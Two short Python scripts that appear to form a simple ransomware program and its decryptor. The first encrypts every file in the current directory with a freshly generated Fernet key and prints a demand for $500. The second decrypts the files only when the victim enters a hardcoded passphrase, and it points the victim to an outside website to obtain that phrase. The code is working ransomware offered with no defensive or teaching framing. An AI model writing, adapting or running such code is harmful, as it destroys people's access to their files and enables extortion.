import os

from cryptography.fernet import Fernet



files=[]



for file in os.listdir():

    if file == "voldemort.py" or file == "thekey.key":

        continue

    if os.path.isfile(file):

        files.append(file)



print(files)





key = Fernet.generate_key()



with open("thekey.key", "wb") as thekey:

    thekey.write(key)



for file in files:

    with open(file, "rb") as thefile:

        contents = thefile.read()

    contents_encrypted = Fernet(key).encrypt(contents)

    with open(file, "wb") as thefile:

          thefile.write(contents_encrypted)



print("All of your files have been encrypted send me 500$ to decrypt")    





import os

from cryptography.fernet import Fernet



files=[]



for file in os.listdir():

    if file == "voldemort.py" or file == "thekey.key" or file == "h.py":

        continue

    if os.path.isfile(file):

        files.append(file)



print(files)



with open("thekey.key", "rb") as key:

    secretkey = key.read()



secretphrase = "kunalmannu"


user_phase = input("To Know The SeCr3t key visit [https://kunalmannuvoldemort.000webhostapp.com/] Enter the secret key to decrypt your files\n :") 





if user_phase == secretphrase:

        for file in files:

            with open(file, "rb") as thefile:

                contents = thefile.read()

            contents_decrypted = Fernet(secretkey).decrypt(contents)

            with open(file, "wb") as thefile:

                thefile.write(contents_decrypted)

            print("congrats, your're files are decrypted. ENJOY")    

else:

    print("Sorry, wrong secret key.Now Your Your Files Will Be Encrypted Forever")            
